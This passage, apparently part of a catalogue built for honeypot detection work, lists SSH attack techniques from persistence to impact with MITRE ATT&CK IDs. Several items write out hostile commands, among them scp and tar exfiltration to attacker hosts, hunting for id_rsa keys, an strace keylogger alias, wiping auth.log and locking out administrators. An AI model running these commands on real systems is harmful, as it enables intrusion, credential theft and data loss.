  12. Backdooring sshrc (T1546.004): Writing a script to /etc/ssh/sshrc. This script executes silently every time any user successfully logs in via SSH.
  13. Weakening sshd_config (PermitRootLogin) (T1098): Changing PermitRootLogin prohibit-password to yes to ensure the attacker can always brute-force root.
  14. Weakening sshd_config (PermitEmptyPasswords) (T1098): Allowing logins without any password at all by modifying the SSH daemon config.
  15. Secondary Hidden SSH Daemon (T1543.002): Spawning a second, hidden sshd process on a high port (e.g., sshd -p 65535 -f /tmp/custom_config).
  16. Modifying ~/.ssh/environment (T1546): If PermitUserEnvironment is enabled, altering environmental variables to load malware upon SSH login.
  17. Backdoored SSH Binary (T1554): Replacing the legitimate /usr/sbin/sshd with a compiled trojan version that accepts a master password.
  18. PAM Module Backdooring (T1556.003): Modifying /etc/pam.d/sshd to use a malicious authentication module that logs passwords.
  19. Client-Side .ssh/config Hijacking (T1546): Modifying the honeypot's SSH client config to automatically route outbound connections through an attacker proxy.
  20. Stealing Host Keys (T1552): Stealing /etc/ssh/ssh_host_rsa_key to seamlessly spoof the honeypot in the future (Man-in-the-Middle).
  ### Privilege Escalation
  21. SSH Agent Forwarding Abuse (T1556): If an admin logs into the compromised honeypot using ssh -A, the attacker (as root) can hijack the socket to log into
  other servers as the admin.
  22. LD_PRELOAD via SSH Environment (T1574.006): Using the .ssh/environment file to load a malicious .so object into root processes.
  23. SUDO over SSH without TTY (T1548.003): Running ssh user@host "sudo -S id < /tmp/password.txt" to escalate privileges automatically in a script.
  24. Exploiting MOTD Execution (T1546.004): Modifying /etc/update-motd.d/. When a victim logs in via SSH, the MOTD scripts run as root, executing the attacker's
  payload.
  25. SSH Daemon Race Conditions (T1068): Exploiting rare race conditions in how sshd handles privileges during login (e.g., older OpenSSH bugs).

  ### Defense Evasion

  26. Non-Standard Ports (T1571): Running SSH on port 53 (DNS) or 443 (HTTPS) to blend in with normal network traffic.
  27. Obfuscating SSH (Stunnel) (T1027): Wrapping the SSH connection inside an SSL/TLS tunnel to hide the SSH handshake from Deep Packet Inspection.
  28. Silencing SSH Logs (T1562.001): Modifying sshd_config to set LogLevel QUIET so no logins are recorded in auth logs.
  29. Wiping auth.log (T1070.002): Running cat /dev/null > /var/log/auth.log to erase records of the SSH breach.
  30. Tor Hidden Service SSH (T1090.003): Installing Tor and configuring the SSH daemon as a .onion hidden service to bypass all inbound firewalls entirely.

  ### Credential Access

  31. Hunting Private Keys (T1552.004): Running find / -name "*id_rsa*" to steal credentials for lateral movement.
  32. known_hosts Parsing (T1552.001): Reading ~/.ssh/known_hosts to discover exactly which internal servers the victim communicates with.
  33. In-Memory Password Dumping (T1003.008): Using tools like mimipenguin or gdb to dump cleartext SSH passwords directly from the RAM of the sshd process.
  34. SSH Client Keylogger Wrapper (T1056.001): Creating a bash alias alias ssh='strace -e read -o /tmp/keys.txt ssh' to capture passwords typed by the user.
  35. Hijacking SSH_AUTH_SOCK (T1556): Locating the environmental variable for an active SSH session and using it to authenticate without needing the private key
  file.

  ### Discovery

  36. Port 22 Sweeping (T1046): Running nmap -p 22 172.18.0.0/24 from the honeypot to find other SSH servers.
  37. Key Scanning (T1046): Using ssh-keyscan against internal IPs to gather SSH banners and versions.
  38. SSH Banner Grabbing (T1082): Using nc 172.18.0.5 22 to read the SSH banner (e.g., SSH-2.0-OpenSSH_8.9p1) to identify vulnerable OS versions.
  39. .ssh/config Enumeration (T1082): Reading user config files to find internal hostnames, custom ports, and usernames used by the victim.
  40. Authorized Keys Mapping (T1087): Reading authorized_keys comments (e.g., user@dev-laptop) to map out the organization's user endpoints.

  ### Lateral Movement

  41. SSH Jump Hosts (Pivoting) (T1090.001): Using the compromised honeypot as a bridge to reach protected servers: ssh -J attacker@honeypot user@internal_db.
  42. SSH Key Propagation (T1550.002): Using ssh-copy-id to rapidly copy the attacker's public key to all discovered internal servers.
  43. TTY Hijacking (T1563.001): Using tools like reptyr to physically take over an active SSH terminal session of a logged-in administrator.
  44. Local Port Forwarding (T1090.001): ssh -L 3306:internal_db:3306 user@honeypot to securely tunnel an internal database port out to the attacker's laptop.
  45. Remote Port Forwarding (T1090.001): ssh -R 4444:127.0.0.1:22 attacker@external to force the honeypot to dial out through the firewall and expose its SSH
  port to the internet.

  ### Exfiltration & Collection

  46. SCP Exfiltration (T1048.002): Securely copying sensitive data out of the network: scp -r /etc/ attacker@kali.org:/tmp/loot/.
  47. SFTP Data Theft (T1048.002): Using the SSH File Transfer Protocol subsystem to interactively browse and steal files securely.
  48. Dynamic Port Forwarding (SOCKS) (T1090): ssh -D 9050 user@honeypot turns the SSH connection into a full SOCKS proxy, allowing the attacker to route web
  browsers and hacking tools directly through the honeypot into the corporate network.
  49. Tar Piping over SSH (T1048.002): tar -czf - /var/log | ssh attacker@kali "cat > /tmp/logs.tar.gz". This compresses and exfiltrates files entirely in memory
  without dropping a zip file on the honeypot's disk.

  ### Impact

  50. SSH Ransomware (Lockout) (T1489): The attacker deletes all authorized_keys, disables password authentication in sshd_config, restarts sshd, and drops a
  ransom note. This permanently locks all legitimate administrators out of the server over the network.
